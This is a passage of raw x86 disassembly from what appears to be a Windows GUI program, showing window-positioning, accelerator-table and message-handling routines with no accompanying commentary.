  404c1c:	b8 01 00 ff ff       	mov    $0xffff0001,%eax
  404c21:	3b f8                	cmp    %eax,%edi
  404c23:	74 05                	je     0x404c2a
  404c25:	39 45 10             	cmp    %eax,0x10(%ebp)
  404c28:	75 0d                	jne    0x404c37
  404c2a:	f6 c3 03             	test   $0x3,%bl
  404c2d:	75 08                	jne    0x404c37
  404c2f:	bf 00 00 00 80       	mov    $0x80000000,%edi
  404c34:	89 7d 10             	mov    %edi,0x10(%ebp)
  404c37:	f6 c3 01             	test   $0x1,%bl
  404c3a:	74 37                	je     0x404c73
  404c3c:	6a 00                	push   $0x0
  404c3e:	ff 15 e4 a7 40 00    	call   *0x40a7e4
  404c44:	39 45 14             	cmp    %eax,0x14(%ebp)
  404c47:	7e 03                	jle    0x404c4c
  404c49:	89 45 14             	mov    %eax,0x14(%ebp)
  404c4c:	2b 45 14             	sub    0x14(%ebp),%eax
  404c4f:	6a 01                	push   $0x1
  404c51:	99                   	cltd
  404c52:	2b c2                	sub    %edx,%eax
  404c54:	8b f8                	mov    %eax,%edi
  404c56:	d1 ff                	sar    $1,%edi
  404c58:	ff 15 e4 a7 40 00    	call   *0x40a7e4
  404c5e:	39 45 18             	cmp    %eax,0x18(%ebp)
  404c61:	7e 03                	jle    0x404c66
  404c63:	89 45 18             	mov    %eax,0x18(%ebp)
  404c66:	2b 45 18             	sub    0x18(%ebp),%eax
  404c69:	99                   	cltd
  404c6a:	2b c2                	sub    %edx,%eax
  404c6c:	d1 f8                	sar    $1,%eax
  404c6e:	89 45 10             	mov    %eax,0x10(%ebp)
  404c71:	eb 56                	jmp    0x404cc9
  404c73:	f6 c3 02             	test   $0x2,%bl
  404c76:	74 51                	je     0x404cc9
  404c78:	8b 45 24             	mov    0x24(%ebp),%eax
  404c7b:	85 c0                	test   %eax,%eax
  404c7d:	75 0a                	jne    0x404c89
  404c7f:	ff 15 e8 a7 40 00    	call   *0x40a7e8
  404c85:	85 c0                	test   %eax,%eax
  404c87:	74 40                	je     0x404cc9
  404c89:	8d 4d f0             	lea    -0x10(%ebp),%ecx
  404c8c:	51                   	push   %ecx
  404c8d:	50                   	push   %eax
  404c8e:	ff 15 ec a7 40 00    	call   *0x40a7ec
  404c94:	8b 45 f8             	mov    -0x8(%ebp),%eax
  404c97:	2b 45 f0             	sub    -0x10(%ebp),%eax
  404c9a:	2b 45 14             	sub    0x14(%ebp),%eax
  404c9d:	99                   	cltd
  404c9e:	2b c2                	sub    %edx,%eax
  404ca0:	8b f8                	mov    %eax,%edi
  404ca2:	8b 45 fc             	mov    -0x4(%ebp),%eax
  404ca5:	2b 45 f4             	sub    -0xc(%ebp),%eax
  404ca8:	d1 ff                	sar    $1,%edi
  404caa:	2b 45 18             	sub    0x18(%ebp),%eax
  404cad:	03 7d f0             	add    -0x10(%ebp),%edi
  404cb0:	99                   	cltd
  404cb1:	2b c2                	sub    %edx,%eax
  404cb3:	d1 f8                	sar    $1,%eax
  404cb5:	03 45 f4             	add    -0xc(%ebp),%eax
  404cb8:	85 ff                	test   %edi,%edi
  404cba:	89 45 10             	mov    %eax,0x10(%ebp)
  404cbd:	7d 02                	jge    0x404cc1
  404cbf:	33 ff                	xor    %edi,%edi
  404cc1:	85 c0                	test   %eax,%eax
  404cc3:	7d 04                	jge    0x404cc9
  404cc5:	83 65 10 00          	andl   $0x0,0x10(%ebp)
  404cc9:	33 c0                	xor    %eax,%eax
  404ccb:	50                   	push   %eax
  404ccc:	ff 35 fc b0 40 00    	push   0x40b0fc
  404cd2:	83 e3 fc             	and    $0xfffffffc,%ebx
  404cd5:	50                   	push   %eax
  404cd6:	ff 75 24             	push   0x24(%ebp)
  404cd9:	8d 8d c4 fe ff ff    	lea    -0x13c(%ebp),%ecx
  404cdf:	ff 75 18             	push   0x18(%ebp)
  404ce2:	ff 75 14             	push   0x14(%ebp)
  404ce5:	ff 75 10             	push   0x10(%ebp)
  404ce8:	57                   	push   %edi
  404ce9:	53                   	push   %ebx
  404cea:	ff 75 1c             	push   0x1c(%ebp)
  404ced:	51                   	push   %ecx
  404cee:	50                   	push   %eax
  404cef:	ff 15 8c a7 40 00    	call   *0x40a78c
  404cf5:	33 ff                	xor    %edi,%edi
  404cf7:	3b c7                	cmp    %edi,%eax
  404cf9:	89 06                	mov    %eax,(%esi)
  404cfb:	0f 84 bb 00 00 00    	je     0x404dbc
  404d01:	8b 4d 08             	mov    0x8(%ebp),%ecx
  404d04:	41                   	inc    %ecx
  404d05:	51                   	push   %ecx
  404d06:	68 70 90 40 00       	push   $0x409070
  404d0b:	50                   	push   %eax
  404d0c:	ff 15 b8 a7 40 00    	call   *0x40a7b8
  404d12:	39 7d 20             	cmp    %edi,0x20(%ebp)
  404d15:	74 22                	je     0x404d39
  404d17:	f7 c3 00 00 00 01    	test   $0x1000000,%ebx
  404d1d:	74 04                	je     0x404d23
  404d1f:	6a 03                	push   $0x3
  404d21:	eb 0e                	jmp    0x404d31
  404d23:	f7 c3 00 00 00 20    	test   $0x20000000,%ebx
  404d29:	74 04                	je     0x404d2f
  404d2b:	6a 02                	push   $0x2
  404d2d:	eb 02                	jmp    0x404d31
  404d2f:	6a 01                	push   $0x1
  404d31:	ff 36                	push   (%esi)
  404d33:	ff 15 f0 a7 40 00    	call   *0x40a7f0
  404d39:	81 e3 00 00 00 21    	and    $0x21000000,%ebx
  404d3f:	f7 db                	neg    %ebx
  404d41:	1b db                	sbb    %ebx,%ebx
  404d43:	6a 0c                	push   $0xc
  404d45:	f7 db                	neg    %ebx
  404d47:	57                   	push   %edi
  404d48:	89 5e 2c             	mov    %ebx,0x2c(%esi)
  404d4b:	c7 46 10 02 00 00 00 	movl   $0x2,0x10(%esi)
  404d52:	ff 35 f8 b0 40 00    	push   0x40b0f8
  404d58:	ff 15 e0 a6 40 00    	call   *0x40a6e0
  404d5e:	89 46 04             	mov    %eax,0x4(%esi)
  404d61:	66 c7 40 02 09 00    	movw   $0x9,0x2(%eax)
  404d67:	8b 46 04             	mov    0x4(%esi),%eax
  404d6a:	66 c7 40 04 01 fa    	movw   $0xfa01,0x4(%eax)
  404d70:	8b 46 04             	mov    0x4(%esi),%eax
  404d73:	c6 00 03             	movb   $0x3,(%eax)
  404d76:	8b 46 04             	mov    0x4(%esi),%eax
  404d79:	66 c7 40 08 09 00    	movw   $0x9,0x8(%eax)
  404d7f:	8b 46 04             	mov    0x4(%esi),%eax
  404d82:	66 c7 40 0a 02 fa    	movw   $0xfa02,0xa(%eax)
  404d88:	8b 46 04             	mov    0x4(%esi),%eax
  404d8b:	c6 40 06 07          	movb   $0x7,0x6(%eax)
  404d8f:	ff 76 10             	push   0x10(%esi)
  404d92:	ff 76 04             	push   0x4(%esi)
  404d95:	ff 15 f4 a7 40 00    	call   *0x40a7f4
  404d9b:	83 4e 14 ff          	orl    $0xffffffff,0x14(%esi)
  404d9f:	39 7d ec             	cmp    %edi,-0x14(%ebp)
  404da2:	89 46 08             	mov    %eax,0x8(%esi)
  404da5:	89 7e 1c             	mov    %edi,0x1c(%esi)
  404da8:	74 07                	je     0x404db1
  404daa:	ff 36                	push   (%esi)
  404dac:	e8 32 31 00 00       	call   0x407ee3
  404db1:	8b 45 08             	mov    0x8(%ebp),%eax
  404db4:	3b c6                	cmp    %esi,%eax
  404db6:	74 27                	je     0x404ddf
  404db8:	8b 06                	mov    (%esi),%eax
  404dba:	eb 23                	jmp    0x404ddf
  404dbc:	ff 35 fc b0 40 00    	push   0x40b0fc
  404dc2:	8d 85 c4 fe ff ff    	lea    -0x13c(%ebp),%eax
  404dc8:	50                   	push   %eax
  404dc9:	ff 15 cc a7 40 00    	call   *0x40a7cc
  404dcf:	ff 75 08             	push   0x8(%ebp)
  404dd2:	ff 35 2c b4 40 00    	push   0x40b42c
  404dd8:	e8 de 18 00 00       	call   0x4066bb
  404ddd:	33 c0                	xor    %eax,%eax
  404ddf:	5f                   	pop    %edi
  404de0:	5e                   	pop    %esi
  404de1:	5b                   	pop    %ebx
  404de2:	c9                   	leave
  404de3:	c2 20 00             	ret    $0x20
  404de6:	55                   	push   %ebp
  404de7:	8b ec                	mov    %esp,%ebp
  404de9:	6a 00                	push   $0x0
  404deb:	ff 75 20             	push   0x20(%ebp)
  404dee:	ff 75 1c             	push   0x1c(%ebp)
  404df1:	ff 75 18             	push   0x18(%ebp)
  404df4:	ff 75 14             	push   0x14(%ebp)
  404df7:	ff 75 10             	push   0x10(%ebp)
  404dfa:	ff 75 0c             	push   0xc(%ebp)
  404dfd:	ff 75 08             	push   0x8(%ebp)
  404e00:	e8 fe fc ff ff       	call   0x404b03
  404e05:	5d                   	pop    %ebp
  404e06:	c2 1c 00             	ret    $0x1c
  404e09:	55                   	push   %ebp
  404e0a:	8b ec                	mov    %esp,%ebp
  404e0c:	51                   	push   %ecx
  404e0d:	56                   	push   %esi
  404e0e:	ff 75 08             	push   0x8(%ebp)
  404e11:	c7 45 fc 03 00 00 00 	movl   $0x3,-0x4(%ebp)
  404e18:	ff 35 2c b4 40 00    	push   0x40b42c
  404e1e:	e8 6d 18 00 00       	call   0x406690
  404e23:	8b f0                	mov    %eax,%esi
  404e25:	85 f6                	test   %esi,%esi
  404e27:	0f 84 ef 00 00 00    	je     0x404f1c
  404e2d:	f7 45 0c 00 00 01 00 	testl  $0x10000,0xc(%ebp)
  404e34:	74 07                	je     0x404e3d
  404e36:	c7 45 fc 07 00 00 00 	movl   $0x7,-0x4(%ebp)
  404e3d:	f7 45 0c 00 00 02 00 	testl  $0x20000,0xc(%ebp)
  404e44:	74 04                	je     0x404e4a
  404e46:	83 4d fc 08          	orl    $0x8,-0x4(%ebp)
  404e4a:	f7 45 0c 00 00 04 00 	testl  $0x40000,0xc(%ebp)
  404e51:	74 04                	je     0x404e57
  404e53:	83 4d fc 10          	orl    $0x10,-0x4(%ebp)
  404e57:	8b 4e 10             	mov    0x10(%esi),%ecx
  404e5a:	81 65 0c ff ff 00 00 	andl   $0xffff,0xc(%ebp)
  404e61:	33 c0                	xor    %eax,%eax
  404e63:	85 c9                	test   %ecx,%ecx
  404e65:	57                   	push   %edi
  404e66:	7e 1c                	jle    0x404e84
  404e68:	8b 7e 04             	mov    0x4(%esi),%edi
  404e6b:	0f b7 57 02          	movzwl 0x2(%edi),%edx
  404e6f:	39 55 0c             	cmp    %edx,0xc(%ebp)
  404e72:	75 08                	jne    0x404e7c
  404e74:	0f b6 17             	movzbl (%edi),%edx
  404e77:	39 55 fc             	cmp    %edx,-0x4(%ebp)
  404e7a:	74 25                	je     0x404ea1
  404e7c:	40                   	inc    %eax
  404e7d:	83 c7 06             	add    $0x6,%edi
  404e80:	3b c1                	cmp    %ecx,%eax
  404e82:	7c e7                	jl     0x404e6b
  404e84:	8d 41 01             	lea    0x1(%ecx),%eax
  404e87:	83 f8 01             	cmp    $0x1,%eax
  404e8a:	89 46 10             	mov    %eax,0x10(%esi)
  404e8d:	75 23                	jne    0x404eb2
  404e8f:	6a 06                	push   $0x6
  404e91:	6a 00                	push   $0x0
  404e93:	ff 35 f8 b0 40 00    	push   0x40b0f8
  404e99:	ff 15 e0 a6 40 00    	call   *0x40a6e0
  404e9f:	eb 26                	jmp    0x404ec7
  404ea1:	66 8b 55 10          	mov    0x10(%ebp),%dx
  404ea5:	6b c0 06             	imul   $0x6,%eax,%eax
  404ea8:	8b 4e 04             	mov    0x4(%esi),%ecx
  404eab:	66 89 54 08 04       	mov    %dx,0x4(%eax,%ecx,1)
  404eb0:	eb 4c                	jmp    0x404efe
  404eb2:	6b c0 06             	imul   $0x6,%eax,%eax
  404eb5:	50                   	push   %eax
  404eb6:	ff 76 04             	push   0x4(%esi)
  404eb9:	6a 00                	push   $0x0
  404ebb:	ff 35 f8 b0 40 00    	push   0x40b0f8
  404ec1:	ff 15 18 a7 40 00    	call   *0x40a718
  404ec7:	66 8b 55 0c          	mov    0xc(%ebp),%dx
  404ecb:	89 46 04             	mov    %eax,0x4(%esi)
  404ece:	8b 46 10             	mov    0x10(%esi),%eax
  404ed1:	8b 4e 04             	mov    0x4(%esi),%ecx
  404ed4:	6b c0 06             	imul   $0x6,%eax,%eax
  404ed7:	66 89 54 08 fc       	mov    %dx,-0x4(%eax,%ecx,1)
  404edc:	8b 46 10             	mov    0x10(%esi),%eax
  404edf:	8b 4e 04             	mov    0x4(%esi),%ecx
  404ee2:	6b c0 06             	imul   $0x6,%eax,%eax
  404ee5:	66 8b 55 10          	mov    0x10(%ebp),%dx
  404ee9:	66 89 54 08 fe       	mov    %dx,-0x2(%eax,%ecx,1)
  404eee:	8b 46 10             	mov    0x10(%esi),%eax
  404ef1:	8b 4e 04             	mov    0x4(%esi),%ecx
  404ef4:	6b c0 06             	imul   $0x6,%eax,%eax
  404ef7:	8a 55 fc             	mov    -0x4(%ebp),%dl
  404efa:	88 54 08 fa          	mov    %dl,-0x6(%eax,%ecx,1)
  404efe:	8b 46 08             	mov    0x8(%esi),%eax
  404f01:	85 c0                	test   %eax,%eax
  404f03:	5f                   	pop    %edi
  404f04:	74 07                	je     0x404f0d
  404f06:	50                   	push   %eax
  404f07:	ff 15 d0 a7 40 00    	call   *0x40a7d0
  404f0d:	ff 76 10             	push   0x10(%esi)
  404f10:	ff 76 04             	push   0x4(%esi)
  404f13:	ff 15 f4 a7 40 00    	call   *0x40a7f4
  404f19:	89 46 08             	mov    %eax,0x8(%esi)
  404f1c:	8b 46 08             	mov    0x8(%esi),%eax
  404f1f:	5e                   	pop    %esi
  404f20:	c9                   	leave
  404f21:	c2 0c 00             	ret    $0xc
  404f24:	55                   	push   %ebp
  404f25:	8b ec                	mov    %esp,%ebp
  404f27:	83 ec 1c             	sub    $0x1c,%esp
  404f2a:	53                   	push   %ebx
  404f2b:	56                   	push   %esi
  404f2c:	57                   	push   %edi
  404f2d:	ff 35 30 b4 40 00    	push   0x40b430
  404f33:	e8 f5 14 00 00       	call   0x40642d
  404f38:	8b 1d dc a6 40 00    	mov    0x40a6dc,%ebx
  404f3e:	8b f0                	mov    %eax,%esi
  404f40:	8b 46 54             	mov    0x54(%esi),%eax
  404f43:	33 ff                	xor    %edi,%edi
  404f45:	3b c7                	cmp    %edi,%eax
  404f47:	74 20                	je     0x404f69
  404f49:	8b 40 14             	mov    0x14(%eax),%eax
  404f4c:	3b c7                	cmp    %edi,%eax
  404f4e:	74 0a                	je     0x404f5a
  404f50:	50                   	push   %eax
  404f51:	57                   	push   %edi
  404f52:	ff 35 f8 b0 40 00    	push   0x40b0f8
  404f58:	ff d3                	call   *%ebx
  404f5a:	ff 76 54             	push   0x54(%esi)
  404f5d:	57                   	push   %edi
  404f5e:	ff 35 f8 b0 40 00    	push   0x40b0f8
  404f64:	ff d3                	call   *%ebx
  404f66:	89 7e 54             	mov    %edi,0x54(%esi)
  404f69:	8b 46 18             	mov    0x18(%esi),%eax
  404f6c:	83 4e 08 ff          	orl    $0xffffffff,0x8(%esi)
  404f70:	3b c7                	cmp    %edi,%eax
  404f72:	74 2f                	je     0x404fa3
  404f74:	8b 48 04             	mov    0x4(%eax),%ecx
  404f77:	89 4d 08             	mov    %ecx,0x8(%ebp)
  404f7a:	8b 48 08             	mov    0x8(%eax),%ecx
  404f7d:	89 4e 04             	mov    %ecx,0x4(%esi)
  404f80:	89 7e 0c             	mov    %edi,0xc(%esi)
  404f83:	8b 08                	mov    (%eax),%ecx
  404f85:	50                   	push   %eax
  404f86:	57                   	push   %edi
  404f87:	89 4e 18             	mov    %ecx,0x18(%esi)
  404f8a:	ff 35 f8 b0 40 00    	push   0x40b0f8
  404f90:	ff d3                	call   *%ebx
  404f92:	39 7e 18             	cmp    %edi,0x18(%esi)
  404f95:	0f 85 b9 00 00 00    	jne    0x405054
  404f9b:	89 7e 1c             	mov    %edi,0x1c(%esi)
  404f9e:	e9 b1 00 00 00       	jmp    0x405054
  404fa3:	83 7d 08 ff          	cmpl   $0xffffffff,0x8(%ebp)
  404fa7:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  404faa:	74 47                	je     0x404ff3
  404fac:	8b 1d f8 a7 40 00    	mov    0x40a7f8,%ebx
  404fb2:	6a 03                	push   $0x3
  404fb4:	57                   	push   %edi
  404fb5:	57                   	push   %edi
  404fb6:	57                   	push   %edi
  404fb7:	50                   	push   %eax
  404fb8:	ff d3                	call   *%ebx
  404fba:	85 c0                	test   %eax,%eax
  404fbc:	75 3f                	jne    0x404ffd
  404fbe:	39 7d 08             	cmp    %edi,0x8(%ebp)
  404fc1:	75 07                	jne    0x404fca
  404fc3:	33 c0                	xor    %eax,%eax
  404fc5:	e9 8d 00 00 00       	jmp    0x405057
  404fca:	68 ff 01 00 00       	push   $0x1ff
  404fcf:	ff 75 08             	push   0x8(%ebp)
  404fd2:	57                   	push   %edi
  404fd3:	57                   	push   %edi
  404fd4:	57                   	push   %edi
  404fd5:	ff 15 fc a7 40 00    	call   *0x40a7fc
  404fdb:	3d 02 01 00 00       	cmp    $0x102,%eax
  404fe0:	74 e1                	je     0x404fc3
  404fe2:	6a 03                	push   $0x3
  404fe4:	57                   	push   %edi
  404fe5:	57                   	push   %edi
  404fe6:	57                   	push   %edi
  404fe7:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  404fea:	50                   	push   %eax
  404feb:	ff d3                	call   *%ebx
  404fed:	85 c0                	test   %eax,%eax
  404fef:	75 0c                	jne    0x404ffd
  404ff1:	eb d0                	jmp    0x404fc3
  404ff3:	57                   	push   %edi
  404ff4:	57                   	push   %edi
  404ff5:	57                   	push   %edi
  404ff6:	50                   	push   %eax
  404ff7:	ff 15 00 a8 40 00    	call   *0x40a800
  404ffd:	ff 15 e8 a7 40 00    	call   *0x40a7e8
  405003:	8b d8                	mov    %eax,%ebx
  405005:	53                   	push   %ebx
  405006:	e8 31 0d 00 00       	call   0x405d3c
  40500b:	3b c7                	cmp    %edi,%eax
  40500d:	74 10                	je     0x40501f
  40500f:	8d 4d e4             	lea    -0x1c(%ebp),%ecx
  405012:	51                   	push   %ecx
  405013:	50                   	push   %eax
  405014:	53                   	push   %ebx
  405015:	ff 15 04 a8 40 00    	call   *0x40a804
  40501b:	85 c0                	test   %eax,%eax
  40501d:	75 14                	jne    0x405033
  40501f:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  405022:	50                   	push   %eax
  405023:	ff 15 08 a8 40 00    	call   *0x40a808
  405029:	8d 45 e4             	lea    -0x1c(%ebp),%eax
  40502c:	50                   	push   %eax
  40502d:	ff 15 0c a8 40 00    	call   *0x40a80c
  405033:	8b 46 0c             	mov    0xc(%esi),%eax
  405036:	3b c7                	cmp    %edi,%eax
  405038:	74 08                	je     0x405042
  40503a:	89 45 08             	mov    %eax,0x8(%ebp)
  40503d:	89 7e 0c             	mov    %edi,0xc(%esi)
  405040:	eb 12                	jmp    0x405054
  405042:	8b 45 e8             	mov    -0x18(%ebp),%eax
  405045:	89 45 08             	mov    %eax,0x8(%ebp)
  405048:	8b 45 ec             	mov    -0x14(%ebp),%eax
  40504b:	89 46 10             	mov    %eax,0x10(%esi)
  40504e:	8b 45 f0             	mov    -0x10(%ebp),%eax
  405051:	89 46 14             	mov    %eax,0x14(%esi)
  405054:	8b 45 08             	mov    0x8(%ebp),%eax
  405057:	5f                   	pop    %edi
  405058:	5e                   	pop    %esi
  405059:	5b                   	pop    %ebx
  40505a:	c9                   	leave
  40505b:	c2 04 00             	ret    $0x4
  40505e:	6a ff                	push   $0xffffffff
  405060:	e8 bf fe ff ff       	call   0x404f24
  405065:	c3                   	ret
  405066:	ff 35 30 b4 40 00    	push   0x40b430
  40506c:	e8 bc 13 00 00       	call   0x40642d
  405071:	8b 00                	mov    (%eax),%eax
  405073:	c3                   	ret
  405074:	ff 35 30 b4 40 00    	push   0x40b430
  40507a:	e8 ae 13 00 00       	call   0x40642d
  40507f:	8b 00                	mov    (%eax),%eax
  405081:	c3                   	ret
  405082:	6a 00                	push   $0x0
  405084:	6a 00                	push   $0x0
  405086:	6a 5c                	push   $0x5c
  405088:	e8 a7 13 00 00       	call   0x406434
  40508d:	a3 ac b3 40 00       	mov    %eax,0x40b3ac
  405092:	c3                   	ret
  405093:	ff 74 24 0c          	push   0xc(%esp)
  405097:	ff 74 24 0c          	push   0xc(%esp)
  40509b:	ff 15 10 a8 40 00    	call   *0x40a810
  4050a1:	0f b7 4c 24 04       	movzwl 0x4(%esp),%ecx
  4050a6:	68 40 80 00 00       	push   $0x8040
  4050ab:	33 c0                	xor    %eax,%eax
  4050ad:	50                   	push   %eax
  4050ae:	50                   	push   %eax
  4050af:	6a 02                	push   $0x2
  4050b1:	51                   	push   %ecx
  4050b2:	50                   	push   %eax
  4050b3:	ff 15 14 a8 40 00    	call   *0x40a814
  4050b9:	50                   	push   %eax
  4050ba:	ff 15 18 a8 40 00    	call   *0x40a818
  4050c0:	c3                   	ret
  4050c1:	53                   	push   %ebx
  4050c2:	8b 58 30             	mov    0x30(%eax),%ebx
  4050c5:	83 fb 01             	cmp    $0x1,%ebx
  4050c8:	56                   	push   %esi
  4050c9:	57                   	push   %edi
  4050ca:	8b f9                	mov    %ecx,%edi
  4050cc:	74 0a                	je     0x4050d8
  4050ce:	83 fb 04             	cmp    $0x4,%ebx
  4050d1:	74 05                	je     0x4050d8
  4050d3:	83 fb 07             	cmp    $0x7,%ebx
  4050d6:	75 29                	jne    0x405101
  4050d8:	83 fb 04             	cmp    $0x4,%ebx
  4050db:	89 78 10             	mov    %edi,0x10(%eax)
  4050de:	75 06                	jne    0x4050e6
  4050e0:	8d 4f fe             	lea    -0x2(%edi),%ecx
  4050e3:	89 48 10             	mov    %ecx,0x10(%eax)
  4050e6:	8b 48 18             	mov    0x18(%eax),%ecx
  4050e9:	8b 70 4c             	mov    0x4c(%eax),%esi
  4050ec:	8b d1                	mov    %ecx,%edx
  4050ee:	2b 50 10             	sub    0x10(%eax),%edx
  4050f1:	3b d6                	cmp    %esi,%edx
  4050f3:	7c 07                	jl     0x4050fc
  4050f5:	8b 70 54             	mov    0x54(%eax),%esi
  4050f8:	3b d6                	cmp    %esi,%edx
  4050fa:	7e 05                	jle    0x405101
  4050fc:	2b ce                	sub    %esi,%ecx
  4050fe:	89 48 10             	mov    %ecx,0x10(%eax)
  405101:	83 fb 02             	cmp    $0x2,%ebx
  405104:	74 0a                	je     0x405110
  405106:	83 fb 05             	cmp    $0x5,%ebx
  405109:	74 05                	je     0x405110
  40510b:	83 fb 08             	cmp    $0x8,%ebx
  40510e:	75 1e                	jne    0x40512e
  405110:	8b 50 10             	mov    0x10(%eax),%edx
  405113:	8b 70 4c             	mov    0x4c(%eax),%esi
  405116:	8d 4f 02             	lea    0x2(%edi),%ecx
  405119:	89 48 18             	mov    %ecx,0x18(%eax)
  40511c:	2b ca                	sub    %edx,%ecx
  40511e:	3b ce                	cmp    %esi,%ecx
  405120:	7c 07                	jl     0x405129
  405122:	8b 70 54             	mov    0x54(%eax),%esi
  405125:	3b ce                	cmp    %esi,%ecx
  405127:	7e 05                	jle    0x40512e
  405129:	03 f2                	add    %edx,%esi
  40512b:	89 70 18             	mov    %esi,0x18(%eax)
  40512e:	83 fb 03             	cmp    $0x3,%ebx
  405131:	74 0a                	je     0x40513d
  405133:	83 fb 05             	cmp    $0x5,%ebx
  405136:	74 05                	je     0x40513d
  405138:	83 fb 04             	cmp    $0x4,%ebx
  40513b:	75 31                	jne    0x40516e
  40513d:	83 fb 04             	cmp    $0x4,%ebx
  405140:	8b 7c 24 10          	mov    0x10(%esp),%edi
  405144:	89 78 14             	mov    %edi,0x14(%eax)
  405147:	75 06                	jne    0x40514f
  405149:	8d 4f fe             	lea    -0x2(%edi),%ecx
  40514c:	89 48 14             	mov    %ecx,0x14(%eax)
  40514f:	8b 48 1c             	mov    0x1c(%eax),%ecx
  405152:	8b 70 50             	mov    0x50(%eax),%esi
  405155:	8b d1                	mov    %ecx,%edx
  405157:	2b 50 14             	sub    0x14(%eax),%edx
  40515a:	3b d6                	cmp    %esi,%edx
  40515c:	7d 07                	jge    0x405165
  40515e:	2b ce                	sub    %esi,%ecx
  405160:	89 48 14             	mov    %ecx,0x14(%eax)
  405163:	eb 0d                	jmp    0x405172
  405165:	8b 70 58             	mov    0x58(%eax),%esi
  405168:	3b d6                	cmp    %esi,%edx
  40516a:	7e 06                	jle    0x405172
  40516c:	eb f0                	jmp    0x40515e
  40516e:	8b 7c 24 10          	mov    0x10(%esp),%edi
  405172:	83 fb 06             	cmp    $0x6,%ebx
  405175:	74 0a                	je     0x405181
  405177:	83 fb 08             	cmp    $0x8,%ebx
  40517a:	74 05                	je     0x405181
  40517c:	83 fb 07             	cmp    $0x7,%ebx
  40517f:	75 1e                	jne    0x40519f
  405181:	8b 50 14             	mov    0x14(%eax),%edx
  405184:	8b 70 50             	mov    0x50(%eax),%esi
  405187:	8d 4f 02             	lea    0x2(%edi),%ecx
  40518a:	89 48 1c             	mov    %ecx,0x1c(%eax)
  40518d:	2b ca                	sub    %edx,%ecx
  40518f:	3b ce                	cmp    %esi,%ecx
  405191:	7c 07                	jl     0x40519a
  405193:	8b 70 58             	mov    0x58(%eax),%esi
  405196:	3b ce                	cmp    %esi,%ecx
  405198:	7e 05                	jle    0x40519f
  40519a:	03 f2                	add    %edx,%esi
  40519c:	89 70 1c             	mov    %esi,0x1c(%eax)
  40519f:	5f                   	pop    %edi
  4051a0:	5e                   	pop    %esi
  4051a1:	5b                   	pop    %ebx
  4051a2:	c3                   	ret
  4051a3:	55                   	push   %ebp
  4051a4:	8b ec                	mov    %esp,%ebp
  4051a6:	6a f0                	push   $0xfffffff0
  4051a8:	ff 75 08             	push   0x8(%ebp)
  4051ab:	ff 15 90 a7 40 00    	call   *0x40a790
  4051b1:	a9 00 00 00 40       	test   $0x40000000,%eax
  4051b6:	74 18                	je     0x4051d0
  4051b8:	6a 02                	push   $0x2
  4051ba:	8d 45 0c             	lea    0xc(%ebp),%eax
  4051bd:	50                   	push   %eax
  4051be:	ff 75 08             	push   0x8(%ebp)
  4051c1:	ff 15 bc a7 40 00    	call   *0x40a7bc
  4051c7:	50                   	push   %eax
  4051c8:	6a 00                	push   $0x0
  4051ca:	ff 15 1c a8 40 00    	call   *0x40a81c
  4051d0:	8b 45 18             	mov    0x18(%ebp),%eax
  4051d3:	2b 45 10             	sub    0x10(%ebp),%eax
  4051d6:	6a 01                	push   $0x1
  4051d8:	50                   	push   %eax
  4051d9:	8b 45 14             	mov    0x14(%ebp),%eax
  4051dc:	2b 45 0c             	sub    0xc(%ebp),%eax
  4051df:	50                   	push   %eax
  4051e0:	ff 75 10             	push   0x10(%ebp)
  4051e3:	ff 75 0c             	push   0xc(%ebp)
  4051e6:	ff 75 08             	push   0x8(%ebp)
  4051e9:	ff 15 20 a8 40 00    	call   *0x40a820
  4051ef:	5d                   	pop    %ebp
  4051f0:	c3                   	ret
  4051f1:	55                   	push   %ebp
  4051f2:	8b ec                	mov    %esp,%ebp
  4051f4:	56                   	push   %esi
  4051f5:	57                   	push   %edi
  4051f6:	ff 75 10             	push   0x10(%ebp)
  4051f9:	8b f8                	mov    %eax,%edi
  4051fb:	ff 75 0c             	push   0xc(%ebp)
  4051fe:	ff 15 10 a8 40 00    	call   *0x40a810
  405204:	ff 75 10             	push   0x10(%ebp)
  405207:	8b 4d 0c             	mov    0xc(%ebp),%ecx
  40520a:	8b c7                	mov    %edi,%eax
  40520c:	e8 b0 fe ff ff       	call   0x4050c1
  405211:	59                   	pop    %ecx
  405212:	8d 77 10             	lea    0x10(%edi),%esi
  405215:	56                   	push   %esi
  405216:	ff 77 30             	push   0x30(%edi)
  405219:	68 14 02 00 00       	push   $0x214
  40521e:	ff 75 08             	push   0x8(%ebp)
  405221:	ff 15 64 a7 40 00    	call   *0x40a764
  405227:	83 ec 10             	sub    $0x10,%esp
  40522a:	8b fc                	mov    %esp,%edi
  40522c:	ff 75 08             	push   0x8(%ebp)
  40522f:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  405230:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  405231:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  405232:	a5                   	movsl  %ds:(%esi),%es:(%edi)
  405233:	e8 6b ff ff ff       	call   0x4051a3
  405238:	83 c4 14             	add    $0x14,%esp
  40523b:	5f                   	pop    %edi
  40523c:	5e                   	pop    %esi
  40523d:	5d                   	pop    %ebp
  40523e:	c3                   	ret
  40523f:	55                   	push   %ebp
  405240:	8b ec                	mov    %esp,%ebp
  405242:	83 ec 10             	sub    $0x10,%esp
  405245:	53                   	push   %ebx
  405246:	56                   	push   %esi
  405247:	57                   	push   %edi
  405248:	ff 35 ac b3 40 00    	push   0x40b3ac
  40524e:	e8 da 11 00 00       	call   0x40642d
  405253:	8b f8                	mov    %eax,%edi
  405255:	33 db                	xor    %ebx,%ebx
  405257:	39 1f                	cmp    %ebx,(%edi)
  405259:	c7 45 fc d1 d0 d0 d0 	movl   $0xd0d0d0d1,-0x4(%ebp)
  405260:	0f 85 58 01 00 00    	jne    0x4053be
  405266:	81 7d 0c 12 01 00 00 	cmpl   $0x112,0xc(%ebp)
  40526d:	0f 85 a8 03 00 00    	jne    0x40561b
  405273:	8b 75 10             	mov    0x10(%ebp),%esi
  405276:	8b c6                	mov    %esi,%eax
  405278:	25 f0 ff 00 00       	and    $0xfff0,%eax
  40527d:	3d 00 f0 00 00       	cmp    $0xf000,%eax
  405282:	0f 85 93 03 00 00    	jne    0x40561b
  405288:	53                   	push   %ebx
  405289:	8d 45 f8             	lea    -0x8(%ebp),%eax
  40528c:	50                   	push   %eax
  40528d:	53                   	push   %ebx
  40528e:	6a 26                	push   $0x26
  405290:	ff 15 24 a8 40 00    	call   *0x40a824
